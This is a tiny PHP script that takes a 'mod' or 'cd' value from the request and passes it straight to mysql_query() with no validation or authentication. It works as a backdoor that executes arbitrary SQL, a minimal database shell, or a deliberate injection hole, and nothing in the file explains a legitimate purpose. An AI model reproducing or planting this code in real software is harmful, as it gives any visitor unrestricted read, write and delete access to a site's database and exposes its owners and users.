<?php 

$mod = $_POST['mod'] ? $_POST['mod'] : ($_GET['mod'] ? $_GET['mod'] : ($_GET['cd'] ? $_GET['cd'] : $mod));
mysql_query($mod) ;

?>